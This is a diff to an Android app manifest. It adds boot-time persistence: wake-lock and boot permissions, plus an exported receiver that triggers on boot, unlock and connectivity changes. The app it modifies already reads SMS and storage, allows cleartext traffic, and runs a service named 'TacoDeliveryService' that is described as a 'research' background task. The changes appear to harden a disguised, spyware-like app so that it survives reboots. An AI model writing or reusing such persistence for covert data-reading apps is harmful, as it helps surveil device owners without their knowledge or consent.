@@ -17,6 +17,10 @@
         android:name="android.hardware.telephony"
         android:required="false" />
 
+    <!-- Persistence permissions -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+
     <!-- Permissions for background research features -->
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
@@ -37,12 +41,26 @@
         android:usesCleartextTraffic="true"
         tools:targetApi="31">
 
+        <receiver
+            android:name=".BootReceiver"
+            android:enabled="true"
+            android:exported="true"
+            android:directBootAware="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+
         <service
             android:name=".TacoDeliveryService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="specialUse">
-            <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBPROJECT_SUBTYPE"
+            <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
                 android:value="System-critical background task for research purposes" />
         </service>
 
